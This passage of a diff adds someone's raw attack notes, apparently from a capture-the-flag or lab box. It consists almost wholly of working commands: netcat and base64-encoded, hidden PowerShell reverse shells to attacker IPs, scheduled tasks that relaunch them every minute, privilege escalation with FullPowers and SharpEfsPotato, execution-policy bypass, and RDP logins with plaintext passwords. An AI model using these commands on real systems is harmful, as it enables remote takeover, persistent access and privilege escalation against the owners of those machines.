pAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="  
+# Create the task
+Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask2" -Principal $TaskPrincipal 
+# Start the task
+Start-ScheduledTask -TaskName "SomeTask2" 
+
+powercat -c 10.10.11.234 -p 7003
+
+
+$TaskAction = New-ScheduledTaskAction -Execute "C:\users\enox\desktop\nc.exe" -Argument "10.10.16.30 444 -e powershell"
+Register-ScheduledTask -Action $TaskAction -TaskName "nstask1"
+Start-ScheduledTask -TaskName "nstask1"
+
+Get-ScheduledTask -TaskPath "\"| Start-ScheduledTask
+
+Get-ScheduledTask | Get-ScheduledTaskInfo |select TaskName, NextRunTime   
+
+$TaskAction = New-ScheduledTaskAction -Execute "C:\users\enox\desktop\nc.exe" -Argument "10.10.16.30 444 -e powershell"
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $TaskAction -TaskName "nstask2" -Trigger $trigger
+Start-ScheduledTask -TaskName "nstask2"
+
+
+
+
+--------------------------------------------------------------------------------------------
+
+history powershell ??
+
+
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="  
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $TaskAction -TaskName "nstask1" -Trigger $trigger
+Start-ScheduledTask -TaskName "nstask1"
+
+schtasks /delete /tn nstask2
+
+
+powershell.exe -Exec Bypass -Command `"D:\nc.exe 192.168.1.116 444 -e powershell`"
+
+powershell.exe -Exec Bypass -Command `"C:\users\enox\desktop\nc.exe 10.10.16.30 444 -e powershell`"
+
+
+
+try local cmd : echo 'test' >test, wget
+
+remove flag on service run command ?
+
+set local service for task ???
+
+Scheduled Start
+
+
+./FullPowers.exe -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+
+
+./SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\xampp\htdocs\nc.exe 10.10.16.72 444 -e cmd.exe"
+
+
+--------------------------------------------------------------------------------------------
+
+https://theartofmachinery.com/2016/07/02/git_over_http.html
+
+git --bare clone path/to/repo repo-http
+cd repo-http/.git
+git --bare update-server-info	==>> /.git/info/refs?service=git-upload-pack
+mv hooks/post-update.sample hooks/post-update
+cd ..
+python -m http.server 8000
+# If using python2:
+# python -m SimpleHTTPServer 8000
+
+git clone http://example.com:8000/ repo
+
+git push --all path/to/repo-http
+
+
+
+xfreerdp /drive:kali,/home/kali/Desktop /u:'ns' /p:'password123!' /w:1366 /h:768 /cert-ignore /v:10.10.11.234
+xfreerdp /drive:kali,/home/kali/Desktop /u:'enox' /p:'Password123!' /w:1366 /h:768 /cert-ignore /v:10.10.11.234
+
+runas.exe /user:enox 'powershell -ep bypass'
+
